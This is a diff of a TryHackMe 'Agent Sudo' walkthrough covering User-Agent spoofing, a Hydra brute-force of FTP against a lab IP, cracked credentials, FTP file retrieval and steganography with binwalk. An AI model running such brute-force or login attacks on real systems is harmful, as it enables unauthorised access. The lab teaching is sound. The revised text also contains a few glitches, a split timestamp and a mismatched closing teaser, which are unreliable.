@@ -1,12 +1,11 @@
 ---
 title: Agent Sudo | TryHackMe WriteUp
-date: 2024-05-30
+date: 2024-06-15
 categories: [Walkthrough]
 tags: [TryHackMe]
 ---
 
 ![image](https://github.com/f141ne0/f141ne0.github.io/assets/165682600/d2c9057e-ec75-4e46-93c2-9e88350f1c96)
-
 
 **Lab URL:** [Agent Sudo](https://tryhackme.com/r/room/agentsudoctf)
 
@@ -79,7 +78,7 @@ Open ports and running services:
 
 A web server is running on port 80. Let’s open it and investigate further.
 
-`Access the web server on port 80 (<target_ip>`
+`Access the web server on port 80 (http://10.10.61.20)`
 
 ![Screenshot from 2024-05-30 10-52-30](https://github.com/f141ne0/f141ne0.github.io/assets/165682600/cbe38abb-008a-439b-9f99-0cfb6392e441)
 
@@ -92,7 +91,7 @@ To intercept the request and change the User-Agent, I used Burp Suite's Intruder
 Here's how the modified HTTP request looks like:
 
 ```
-GET / HTTP/1.1
+GET /agent_C_attention.php HTTP/1.1
 Host: 10.10.61.20
 User-Agent: C
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
@@ -108,28 +107,19 @@ When I accessed the `/agent_C_attention.php` page with the appropriate User-Agen
 
 ![Screenshot from 2024-05-30 10-53-24](https://github.com/f141ne0/f141ne0.github.io/assets/165682600/7c0c8451-afee-48a3-86a0-827261a8469b)
 
+This message provides a username, Chris, and hints that it has a weak password. To find the password, we can use a brute-force attack on the FTP service with Hydra.
+
+## Brute Forcing FTP with Hydra
+
+Using Hydra, we can attempt to brute-force the password for the `chris` user:
+
+```bash
+hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.61.20
 ```
-GET /agent_C_attention.php HTTP/1.1
-Host: 10.10.61.20
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-DNT: 1
-Connection: close
-Upgrade-Insecure-Requests: 1
-Sec-GPC: 1
-```
-![Screenshot from 2024-05-30 10-53-50](https://github.com/f141ne0/f141ne0.github.io/assets/165682600/88f1b2d6-b287-4a92-bbb8-bf7100e5353c)
 
-![Screenshot_20240530_120552](https://github.com/f141ne0/f141ne0.github.io/assets/165682600/d0d7244d-7dbf-4f18-90a4-45bdb1ad2e5e)
-
-
-Now we have a username, Chris, and it’s supposed to have a weak password, so now we can Bruteforce FTP with Hydra, using any of the below commands to resolve the password.
+The successful attempt shows:
 
 ```
-┌──(root㉿neo)-[~]
-└─# hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.61.20  
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-30 10:54:56
@@ -138,17 +128,25 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-30 10:54:
 [STATUS] 148.00 tries/min, 148 tries in 00:01h, 14344251 to do in 1615:21h, 16 active
 [21][ftp] host: 10.10.61.20   login: chris   password: crystal
 1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-30 10:56:51
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-30 10:56:
+
+51
 ```
 
-username : chris
-password : crystal
+- **username**: chris
+- **password**: crystal
 
-Now we know the password for the Agent, we can log in through FTP.
+## FTP Access
+
+Now that we have the credentials, we can log in through FTP:
+
+```bash
+ftp 10.10.61.20
+```
+
+Using the obtained credentials:
 
 ```
-┌──(root㉿neo)-[~]
-└─# ftp 10.10.61.20  
 Connected to 10.10.61.20.
 220 (vsFTPd 3.0.3)
 Name (10.10.61.20:nijith): chris
@@ -165,30 +163,21 @@ ftp> ls
 -rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
 226 Directory send OK.
 ftp> mget *
-mget To_agentJ.txt [anpqy?]? 
-229 Entering Extended Passive Mode (|||20361|)
-150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
-100% |*************************************************************************************************************************************************|   217        2.95 MiB/s    00:00 ETA
-226 Transfer complete.
-217 bytes received in 00:00 (1.03 KiB/s)
-mget cute-alien.jpg [anpqy?]? 
-229 Entering Extended Passive Mode (|||5045|)
-150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
-100% |*************************************************************************************************************************************************| 33143       67.14 KiB/s    00:00 ETA
-226 Transfer complete.
-33143 bytes received in 00:00 (45.44 KiB/s)
-mget cutie.png [anpqy?]? 
-229 Entering Extended Passive Mode (|||40027|)
-150 Opening BINARY mode data connection for cutie.png (34842 bytes).
-100% |*************************************************************************************************************************************************| 34842       68.73 KiB/s    00:00 ETA
-226 Transfer complete.
-34842 bytes received in 00:00 (36.18 KiB/s)
-ftp> 
 ```
 
+We download the files to our local machine:
+
 ```
-┌──(root㉿neo)-[~/AgentSudo]
-└─# cat To_agentJ.txt 
+mget To_agentJ.txt
+mget cute-alien.jpg
+mget cutie.png
+```
+
+## Analyzing Files
+
+The content of `To_agentJ.txt`:
+
+```
 Dear agent J,
 
 All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
@@ -197,23 +186,32 @@ From,
 Agent C
 ```
 
-By viewing the “To_agentJ.txt” file, the message was a login
+This hints that the password is hidden in one of the images. We will use steganography tools to extract hidden information.
 
-The password for the chris is stored in the fake picture.
+## Steganography Analysis
 
-So we use “Steghide” to retrieve some hidden info and also checked by “ExifTool” for the “cutie.png” file, but nothing came up. Trying to unzip it with unzip cutie.png, we get an error message: skipping: To_agentR.txt need PK compat. v5.1 (can do v4.6)
+First, we use `steghide` to check for hidden information in the images. We also use `exiftool` to check for any embedded metadata, but nothing significant was found.
 
-I used 7zip: 7z x cutie.png to try and extract it, but we get a password prompt.
+### Using Binwalk
 
-After we tried with “binwalk,” and we got a zip file inside the “cutie.png” file and extracted it from “cutie.png,” but it was encrypted.
+We try `binwalk` to look for hidden files within `cutie.png`:
 
-soon...
+```bash
+binwalk -e cutie.png
+```
 
+Binwalk reveals a hidden zip file inside `cutie.png`, but it is encrypted. We attempt to extract it:
 
+```bash
+7z x cutie.png
+```
 
+However, this prompts for a password. We need to further investigate to find the correct password to extract the hidden contents successfully.
 
+---
 
+**To Be Continued...**
 
+Stay tuned for the next part where we will crack the password for the hidden zip file and continue our journey to uncover the secrets of the deep sea server.
 
-
-
+---
